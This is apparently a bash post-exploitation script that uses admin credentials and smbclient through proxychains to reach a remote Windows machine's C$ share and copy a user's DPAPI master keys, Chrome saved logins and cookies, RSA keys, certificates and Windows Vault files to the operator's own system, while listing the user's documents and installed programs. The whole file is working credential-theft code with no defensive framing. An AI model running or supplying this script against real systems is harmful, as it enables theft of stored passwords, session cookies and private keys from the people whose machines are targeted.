#!/bin/bash
SID="S-1-5-21-......."
username="username-in-profile"
dip="192.168.1.2"
luser="admin"
lpass='Passw0rd!'
iecookies="AppData/Local/Microsoft/Windows/INetCookies"
dumpdir=$dip"_"$username
#iecookies="AppData/Local/Microsoft/Windows"

cd ~/Dump/
mkdir $dumpdir
mkdir $dumpdir/masterkeys
mkdir $dumpdir/chrome
mkdir $dumpdir/rsa
mkdir $dumpdir/certs
mkdir $dumpdir/localvault
mkdir $dumpdir/roamvault


proxychains smbclient -U $luser%$lpass //$dip/c$ -c "lcd /home/user/Dump/$dumpdir/masterkeys; prompt; recurse; ls users/$username/appdata/roaming/microsoft/protect/$SID/; cd users/$username/appdata/roaming/microsoft/protect/$SID/; mget *; lcd /home/user/Dump/$dumpdir/chrome; cd /; cd \"users/$username/appdata/local/google/chrome/user data/default/\"; get \"login data\"; get cookies; lcd /home/user/Dump/$dumpdir/rsa; cd /; cd users/$username/appdata/roaming/microsoft/crypto/rsa/$SID/; mget *; lcd /home/user/Dump/$dumpdir/certs; cd /; cd users/$username/appdata/roaming/microsoft/SystemCertificates/My/Certificates/; mget *; cd /; lcd /home/user/Dump/$dumpdir/localvault; cd users/$username/appdata/local/microsoft/vault/; mget *; cd /; lcd /home/user/Dump/$dumpdir/roamvault; cd users/$username/appdata/roaming/microsoft/vault/; mget *; cd /; lcd /home/user/Dump/$dumpdir/; get users/$username/appdata/roaming/Microsoft/Office/Recent/index.dat; ls users/$username/Documents/; ls users/$username/Desktop/; ls users/$username/Downloads/; recurse; cd /; ls \"program files/\"; ls \"program files (x86)/\"; ls \"users/\"; exit" >> /home/user/Dump/$dumpdir/log.txt



